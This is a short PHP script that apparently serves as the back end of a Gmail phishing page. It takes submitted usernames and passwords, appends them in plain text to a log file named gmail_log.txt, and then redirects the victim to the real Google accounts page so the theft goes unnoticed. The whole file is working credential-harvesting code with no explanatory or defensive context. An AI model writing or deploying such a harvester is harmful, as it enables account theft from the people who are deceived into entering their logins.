<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $user = $_POST['username'];
  $pass = $_POST['password'];
  file_put_contents("gmail_log.txt", "User: $user | Pass: $pass\n", FILE_APPEND);
  header("Location: https://accounts.google.com/"); // Redirect to real Gmail
  exit();
}
?>
